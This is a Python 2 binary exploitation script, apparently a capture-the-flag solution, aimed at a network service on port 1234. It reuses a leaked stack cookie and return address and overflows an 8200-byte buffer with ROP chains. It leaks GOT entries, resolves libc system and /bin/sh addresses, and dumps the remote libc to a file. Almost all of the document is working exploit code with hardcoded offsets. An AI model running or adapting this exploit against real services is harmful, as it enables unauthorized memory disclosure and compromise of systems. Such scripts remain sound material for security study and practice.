#!/usr/bin/env python2
#-*- coding:utf-8 -*-

import os, sys, socket, struct
from zio import *

host = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'

if host == '127.0.0.1':
    dump = '\x00\xe7a\xe6\xe5\x832h0M\xf4$\xff\x7f\x00\x00\x15\xbe\x12\xf6\xdf\x7f\x00\x00'     # local debug
else:
    dump = '\x000\x03\x99\xa2\x83D?\xa0\xf2\xde\x93\xff\x7f\x00\x00\x15\x1e\xf2_\r\x7f\x00\x00'

stack_cookie = l64(dump[:8])
saved_rbp    = l64(dump[8:16])
ret_addr     = l64(dump[16:24])
base = ret_addr - 0xe15

def leak_got(offset):
    io = zio((host, 1234), print_write = False, print_read = False, timeout = 100000)

    rop = 'A' * 8200 + l64(stack_cookie) + l64(saved_rbp)
    rop += l64(base + 0xec6) + 'A' * 8 + l64(5) + 'B' * 8 + l64(base + 0x202018) + 'C' * 8 + l64(base + offset) + l64(4)
    rop += l64(base + 0xeb0)

    io.write(rop)

    io.read_until('thanks.\n')
    left = io.read(8)
    return l64(left + '\x00' * (8 - len(left)))

#for i in range(0x202018, 0x2020b1, 8):
#    print hex(i), ' -> ', hex(leak_got(i))

# 0x202018  ->  0x7f0d5fa2d6d0
# 0x202020  ->  0x7f0d5ff219e6
# 0x202028  ->  0x7f0d5ff219f6
# 0x202030  ->  0x7f0d5fa446a0
# 0x202038  ->  0x0
# 0x202040  ->  0x7f0d5f9855c0
# 0x202048  ->  0x7f0d5fa1d660
# 0x202050  ->  0x7f0d5f952c90
# 0x202058  ->  0x7f0d5fa3a7d0
# 0x202060  ->  0x7f0d5f967c50
# 0x202068  ->  0x7f0d5ff21a76
# 0x202070  ->  0x7f0d5fa2d3c0
# 0x202078  ->  0x7f0d5fa2d2a0
# 0x202080  ->  0x7f0d5f99fbe0
# 0x202088  ->  0x7f0d5f9bdf80
# 0x202090  ->  0x7f0d5fa2d240
# 0x202098  ->  0x7f0d5ff21ad6
# 0x2020a0  ->  0x7f0d5ff21ae6
# 0x2020a8  ->  0x7f0d5f9f2530
# 0x2020b0  ->  0x7f0d5fa2d730

# log('libc_setsockopt = ' + hex(libc_setsockopt), 'yellow')

if host == '127.0.0.1':
    libc_base = libc_setsockopt - 0xe64f0
    libc_system = libc_base + 0x417c0
    libc_binsh = libc_base + 1449524
    libc_pop_rdi = libc_base + 0x00121cc6
else:
    # libc_setsockopt = 0x7f0d5fa2d6d0
    # libc_fclose = 0x7f0d5ff219e6
    libc_base   = 0x7f0d5f931000
    libc_read   = 0x7f0d5fa1d660
    libc_system = libc_base + 0x45660
    libc_binsh = libc_base + 1548561
    libc_pop_rdi = libc_base + 0x00134817

def dump_libc(write_addr, size):
    io = zio((host, 1234), print_write = False, print_read = False, timeout = 100000)

    rop = l64(write_addr) + 'A' * (8200 - 8) + l64(stack_cookie) + l64(saved_rbp)

    rop += l64(base + 0xec6) + 'A' * 8 + l64(0) + 'B' * 8 + l64(saved_rbp - 0x70 - 0x2000) + l64(size) + l64(libc_base) + l64(4)
    rop += l64(base + 0xeb0)

    io.write(rop)

    io.read_until('thanks.\n')
    left = io.read()
    io.close()
    return left

libc_write = libc_read + 90

libc_content = dump_libc(libc_write, 2000000)
f = open('remote_libc.so', 'w')
f.write(libc_content)
f.close()

